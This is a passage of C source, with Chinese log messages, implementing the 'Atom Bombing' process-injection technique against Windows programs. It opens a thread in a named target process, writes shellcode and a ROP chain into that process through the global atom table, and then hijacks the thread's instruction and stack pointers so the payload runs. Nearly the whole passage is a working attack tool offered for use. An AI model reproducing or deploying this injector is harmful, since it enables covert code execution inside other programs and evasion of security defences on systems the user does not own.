        printf("[!] 无法枚举线程\n");
        goto cleanup;
    }

    printf("[+] 找到 %lu 个线程，选择第一个线程\n", threadCount);
    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threads[0]);
    if (!hThread) {
        printf("[!] OpenThread 失败: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[*] 步骤 3: 查找代码洞\n");
    codeCave = FindCodeCave();
    if (!codeCave) {
        printf("[!] 无法找到代码洞\n");
        goto cleanup;
    }
    printf("[+] 代码洞地址: 0x%p\n", codeCave);

    // 计算各部分地址
    PVOID ropAddr = codeCave;
    PVOID shellcodeAddr = (BYTE *)ropAddr + sizeof(ROP_CHAIN);

    printf("[*] 步骤 4: 构建 ROP 链\n");
    if (!BuildRopChain(ropAddr, shellcodeAddr, sizeof(shellcode), &ropChain)) {
        printf("[!] 构建 ROP 链失败\n");
        goto cleanup;
    }

    printf("[*] 步骤 5: 使用 Atom 表写入 Shellcode\n");
    if (!AtomWriteMemory(hThread, shellcodeAddr, shellcode, sizeof(shellcode))) {
        printf("[!] 写入 shellcode 失败\n");
        goto cleanup;
    }

    printf("[*] 步骤 6: 使用 Atom 表写入 ROP 链\n");
    if (!AtomWriteMemory(hThread, ropAddr, &ropChain, sizeof(ropChain))) {
        printf("[!] 写入 ROP 链失败\n");
        goto cleanup;
    }

    printf("[*] 步骤 7: 劫持线程执行 ROP 链\n");

    // 获取线程上下文
    ctx.ContextFlags = CONTEXT_CONTROL;
    SuspendThread(hThread);
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[!] GetThreadContext 失败: %lu\n", GetLastError());
        ResumeThread(hThread);
        goto cleanup;
    }

#ifdef _WIN64
    printf("[*] 原始 RIP: 0x%llX\n", ctx.Rip);

    // 修改上下文指向 ROP 链
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    ctx.Rip = (DWORD64)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    ctx.Rsp = (DWORD64)ropAddr;
    ctx.Rbp = (DWORD64)ropAddr;

    printf("[*] 新 RIP: 0x%llX (NtAllocateVirtualMemory)\n", ctx.Rip);
    printf("[*] 新 RSP: 0x%llX (ROP 链)\n", ctx.Rsp);
#else
    printf("[*] 原始 EIP: 0x%lX\n", ctx.Eip);

    // 修改上下文指向 ROP 链
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    ctx.Eip = (DWORD)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    ctx.Esp = (DWORD)ropAddr;
    ctx.Ebp = (DWORD)ropAddr;

    printf("[*] 新 EIP: 0x%lX (NtAllocateVirtualMemory)\n", ctx.Eip);
    printf("[*] 新 ESP: 0x%lX (ROP 链)\n", ctx.Esp);
#endif

    if (!SetThreadContext(hThread, &ctx)) {
        printf("[!] SetThreadContext 失败: %lu\n", GetLastError());
        ResumeThread(hThread);
        goto cleanup;
    }

    ResumeThread(hThread);

    printf("[+] Atom Bombing 注入成功！\n");
    printf("[*] Shellcode 将在线程恢复后执行\n");
    success = TRUE;

cleanup:
    if (threads) free(threads);
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    return success;
}

// ========================================
// 主函数
// ========================================

int main(int argc, char *argv[]) {
    printf("========================================\n");
    printf("  Atom Bombing\n");
    printf("  全局 Atom 表代码注入\n");
    printf("========================================\n\n");

    if (argc != 2) {
        printf("用法: %s <进程名>\n", argv[0]);
        printf("示例: %s notepad.exe\n", argv[0]);
        return 1;
    }

    const char *processName = argv[1];

    printf("[*] 查找进程: %s\n", processName);
    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        printf("[!] 未找到进程\n");
        return 1;
    }

    printf("[+] 找到进程: PID = %lu\n\n", pid);

    if (!AtomBombingInject(pid)) {
        printf("\n[!] Atom Bombing 失败\n");
        return 1;
    }

    printf("\n[+] 完成！\n");
    return 0;
}
